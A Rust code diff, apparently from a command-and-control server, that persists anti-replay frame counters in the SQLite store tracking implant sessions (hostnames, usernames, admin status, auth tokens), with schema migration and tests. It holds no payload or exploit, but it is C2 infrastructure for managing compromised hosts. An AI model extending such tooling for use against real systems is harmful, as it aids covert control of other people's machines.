@@ -9,10 +9,13 @@
 //!
 //! The in-memory `DashMap` remains the PRIMARY read path — SQLite is the
 //! durability layer only. Ephemeral runtime state (the queued pending tasks,
-//! the undelivered results buffer, the live `SessionKey`, the send/recv
-//! counters) is NOT persisted: those reset on reconnect by design. Session keys
-//! stay ephemeral pubkeys, so an implant that reconnects with the same key
-//! after a restart finds its session metadata already present.
+//! the undelivered results buffer, the live `SessionKey`) is NOT persisted:
+//! those reset on reconnect by design. The send/recv frame counters ARE
+//! persisted (schema v3, `send_counter`/`last_recv` columns) so a restart can
+//! restore anti-replay state; the restored values are advisory — the server
+//! re-derives key material on first post-restart check-in. Session keys stay
+//! ephemeral pubkeys, so an implant that reconnects with the same key after a
+//! restart finds its session metadata already present.
 
 use std::path::{Path, PathBuf};
 use std::sync::Mutex;
@@ -53,6 +56,10 @@ pub struct SessionRecord {
     pub first_seen: u64,
     /// Unix-epoch seconds of the most recent check-in.
     pub last_seen: u64,
+    /// Last S2C frame counter sealed for this session (schema v3+).
+    pub send_counter: u64,
+    /// Highest C2S frame counter received for this session (schema v3+).
+    pub last_recv: u64,
     /// One-time auth token presented at check-in, if any (32 bytes). Persisted
     /// only so a reconnecting implant with the same key is recognized; by the
     /// time this is written the token has already been consumed in the
@@ -69,9 +76,11 @@ pub struct SessionStore {
 impl SessionStore {
     /// Open (or create) the session store at `path`. Shares the DB file with
     /// the cred + implant stores; SQLite WAL handles concurrent access.
+    /// Best-effort 0600s the db file + WAL siblings.
     pub fn open(path: &Path) -> Result<Self> {
         let conn = Connection::open(path)?;
         Self::init(&conn)?;
+        let _ = crate::set_private(path); // best-effort; not fatal
         Ok(Self {
             conn: Mutex::new(conn),
             path: path.to_path_buf(),
@@ -92,6 +101,9 @@ impl SessionStore {
         conn.pragma_update(None, "journal_mode", "WAL")?;
         conn.pragma_update(None, "synchronous", "NORMAL")?;
         conn.pragma_update(None, "foreign_keys", "ON")?;
+        // Same DB file is shared with the cred/implant stores; make contended
+        // writes WAIT (up to 5s) instead of failing with SQLITE_BUSY.
+        conn.busy_timeout(std::time::Duration::from_secs(5))?;
         // `CREATE TABLE IF NOT EXISTS` (not gated by schema version) so the
         // table exists after EVERY open regardless of which store opened the
         // shared DB first — each store now tracks its own version in a
@@ -130,8 +142,7 @@ impl SessionStore {
     /// Append a `if current < N { ALTER ... }` arm here when altering
     /// the `sessions` table post-baseline, and bump
     /// `CURRENT_SCHEMA_VERSION` to match.
-    const CURRENT_SCHEMA_VERSION: i64 = 2;
-
+    const CURRENT_SCHEMA_VERSION: i64 = 3;
 
     fn migrate(conn: &Connection) -> Result<()> {
         // CREATE the version table FIRST so the SELECT below never fails
@@ -141,13 +152,17 @@ impl SessionStore {
                 version INTEGER NOT NULL
             );",
         )?;
-        // Seed version 0 for pre-existing databases that lack the row.
+        // Seed version 0 only when the table is empty. The version table has
+        // no UNIQUE constraint, so a plain INSERT OR IGNORE would append a
+        // stale version=0 row on EVERY open (one per server boot).
         conn.execute(
-            "INSERT OR IGNORE INTO _sessions_schema_version (version) VALUES (0);",
+            "INSERT INTO _sessions_schema_version (version) SELECT 0 WHERE NOT EXISTS \
+             (SELECT 1 FROM _sessions_schema_version);",
             [],
         )?;
+        // MAX() so the gate never depends on unspecified rowid scan order.
         let current: i64 = conn.query_row(
-            "SELECT version FROM _sessions_schema_version LIMIT 1",
+            "SELECT MAX(version) FROM _sessions_schema_version",
             [],
             |r| r.get(0),
         )?;
@@ -156,6 +171,23 @@ impl SessionStore {
             // v1 → v2: session-persistence baseline — the `sessions` table is
             //          created idempotently in `init`, so no ALTER is needed;
             //          this just stamps that this store has run.
+            // v2 → v3: persist per-session frame counters. `DEFAULT 0`
+            //          backfills existing rows, so old rows stay compatible
+            //          (read back with counters 0). NOTE: do NOT add these to
+            //          the baseline CREATE TABLE in `init` — a fresh DB starts
+            //          at version 0 and runs this arm, so the columns must
+            //          exist only AFTER the ALTER (adding them to the CREATE
+            //          would make this arm fail with duplicate-column).
+            if current < 3 {
+                conn.execute(
+                    "ALTER TABLE sessions ADD COLUMN send_counter INTEGER NOT NULL DEFAULT 0",
+                    [],
+                )?;
+                conn.execute(
+                    "ALTER TABLE sessions ADD COLUMN last_recv INTEGER NOT NULL DEFAULT 0",
+                    [],
+                )?;
+            }
             conn.execute(
                 "UPDATE _sessions_schema_version SET version = ?1;",
                 params![Self::CURRENT_SCHEMA_VERSION],
@@ -173,19 +205,22 @@ impl SessionStore {
         conn.execute(
             "INSERT INTO sessions
              (session_id, beacon_id, hostname, username, os, arch, pid,
-              is_admin, first_seen, last_seen, auth_token)
-             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11)
+              is_admin, first_seen, last_seen, auth_token,
+              send_counter, last_recv)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13)
              ON CONFLICT(session_id) DO UPDATE SET
-               beacon_id  = excluded.beacon_id,
-               hostname   = excluded.hostname,
-               username   = excluded.username,
-               os         = excluded.os,
-               arch       = excluded.arch,
-               pid        = excluded.pid,
-               is_admin   = excluded.is_admin,
-               first_seen = excluded.first_seen,
-               last_seen  = excluded.last_seen,
-               auth_token = excluded.auth_token",
+               beacon_id    = excluded.beacon_id,
+               hostname     = excluded.hostname,
+               username     = excluded.username,
+               os           = excluded.os,
+               arch         = excluded.arch,
+               pid          = excluded.pid,
+               is_admin     = excluded.is_admin,
+               first_seen   = excluded.first_seen,
+               last_seen    = excluded.last_seen,
+               auth_token   = excluded.auth_token,
+               send_counter = excluded.send_counter,
+               last_recv    = excluded.last_recv",
             params![
                 r.session_id,
                 r.beacon_id as i64,
@@ -198,9 +233,30 @@ impl SessionStore {
                 r.first_seen as i64,
                 r.last_seen as i64,
                 r.auth_token,
+                r.send_counter as i64,
+                r.last_recv as i64,
             ],
         )?;
         Ok(())
+    }
+
+    /// Persist ONLY the per-session frame counters — the cheap per-frame
+    /// update the server runs after each sealed/decoded frame (the hot path;
+    /// `upsert` would rewrite every metadata column). Returns `true` if a row
+    /// matched. Unknown session → `Ok(false)` (caller decides; the server
+    /// treats it as best-effort).
+    pub fn update_counters(
+        &self,
+        session_id: &str,
+        send_counter: u64,
+        last_recv: u64,
+    ) -> Result<bool> {
+        let conn = self.conn.lock().map_err(|_| SessionStoreError::Poisoned)?;
+        let n = conn.execute(
+            "UPDATE sessions SET send_counter = ?1, last_recv = ?2 WHERE session_id = ?3",
+            params![send_counter as i64, last_recv as i64, session_id],
+        )?;
+        Ok(n > 0)
     }
 
     /// Bump ONLY `last_seen` for an existing session — the cheap update the
@@ -220,7 +276,8 @@ impl SessionStore {
         let conn = self.conn.lock().map_err(|_| SessionStoreError::Poisoned)?;
         let mut stmt = conn.prepare(
             "SELECT session_id, beacon_id, hostname, username, os, arch, pid,
-                    is_admin, first_seen, last_seen, auth_token
+                    is_admin, first_seen, last_seen, auth_token,
+                    send_counter, last_recv
              FROM sessions
              ORDER BY last_seen DESC",
         )?;
@@ -266,6 +323,8 @@ fn row_to_session(row: &rusqlite::Row<'_>) -> rusqlite::Result<SessionRecord> {
         first_seen: row.get::<_, i64>(8)? as u64,
         last_seen: row.get::<_, i64>(9)? as u64,
         auth_token: row.get(10)?,
+        send_counter: row.get::<_, i64>(11)? as u64,
+        last_recv: row.get::<_, i64>(12)? as u64,
     })
 }
 
@@ -285,6 +344,8 @@ mod tests {
             is_admin: 0,
             first_seen,
             last_seen: first_seen,
+            send_counter: 0,
+            last_recv: 0,
             auth_token: Some(vec![0xAB; 32]),
         }
     }
@@ -385,6 +446,93 @@ mod tests {
         assert_eq!(got.first_seen, 4321);
         let _ = std::fs::remove_file(&path);
         let _ = std::fs::remove_file(format!("{}-wal", path.display()));
+    }
+
+    #[test]
+    fn counters_roundtrip_through_upsert() {
+        let s = SessionStore::open_in_memory().unwrap();
+        let mut r = rec("aa", "host-a", 1000);
+        r.send_counter = 41;
+        r.last_recv = 17;
+        s.upsert(&r).unwrap();
+
+        let got = s.list().unwrap().remove(0);
+        assert_eq!(got.send_counter, 41);
+        assert_eq!(got.last_recv, 17);
+    }
+
+    #[test]
+    fn update_counters_persists_and_reports_match() {
+        let s = SessionStore::open_in_memory().unwrap();
+        s.upsert(&rec("aa", "host-a", 1000)).unwrap();
+
+        assert!(s.update_counters("aa", 7, 9).unwrap());
+        let got = s.list().unwrap().remove(0);
+        assert_eq!((got.send_counter, got.last_recv), (7, 9));
+        // Other columns untouched.
+        assert_eq!(got.hostname, "host-a");
+        assert_eq!(got.last_seen, 1000);
+        // Unknown session → Ok(false), no error.
+        assert!(!s.update_counters("nonexistent", 1, 1).unwrap());
+    }
+
+    #[test]
+    fn migrates_v2_sessions_table_adding_counters() {
+        // Simulate a pre-counter database: hand-build the v2 table shape, stamp
+        // _sessions_schema_version = 2, insert a row — then let open() run the
+        // v2 → v3 migration. Old rows must come back with counters defaulted to
+        // 0 (old rows stay compatible), and the store must be writable.
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("nyx-session-migrate-test-{}.db", std::process::id()));
+        let _ = std::fs::remove_file(&path);
+        {
+            let conn = Connection::open(&path).unwrap();
+            conn.execute_batch(
+                "CREATE TABLE sessions (
+                    session_id    TEXT NOT NULL PRIMARY KEY,
+                    beacon_id     INTEGER NOT NULL,
+                    hostname      TEXT NOT NULL,
+                    username      TEXT NOT NULL,
+                    os            TEXT NOT NULL,
+                    arch          INTEGER NOT NULL,
+                    pid           INTEGER NOT NULL,
+                    is_admin      INTEGER NOT NULL,
+                    first_seen    INTEGER NOT NULL,
+                    last_seen     INTEGER NOT NULL,
+                    auth_token    BLOB
+                );
+                CREATE TABLE _sessions_schema_version (version INTEGER NOT NULL);
+                INSERT INTO _sessions_schema_version (version) VALUES (2);
+                INSERT INTO sessions (session_id, beacon_id, hostname, username, os,
+                                      arch, pid, is_admin, first_seen, last_seen)
+                VALUES ('legacy-id', 7, 'legacy-host', 'legacy-user', 'linux',
+                        1, 42, 0, 1000, 2000);",
+            )
+            .unwrap();
+        }
+        let s = SessionStore::open(&path).unwrap();
+        let got = s.list().unwrap().remove(0);
+        assert_eq!(got.session_id, "legacy-id");
+        assert_eq!(got.send_counter, 0, "old rows must backfill DEFAULT 0");
+        assert_eq!(got.last_recv, 0);
+        // The migrated store persists counters fine.
+        assert!(s.update_counters("legacy-id", 7, 9).unwrap());
+        let got = s.list().unwrap().remove(0);
+        assert_eq!((got.send_counter, got.last_recv), (7, 9));
+        // Version must be stamped 3 after the migration.
+        let v: i64 = {
+            let conn = Connection::open(&path).unwrap();
+            conn.query_row(
+                "SELECT version FROM _sessions_schema_version",
+                [],
+                |r| r.get(0),
+            )
+            .unwrap()
+        };
+        assert_eq!(v, 3, "schema version must be stamped to 3");
+        let _ = std::fs::remove_file(&path);
+        let _ = std::fs::remove_file(format!("{}-wal", path.display()));
+        let _ = std::fs::remove_file(format!("{}-shm", path.display()));
     }
 
     #[test]
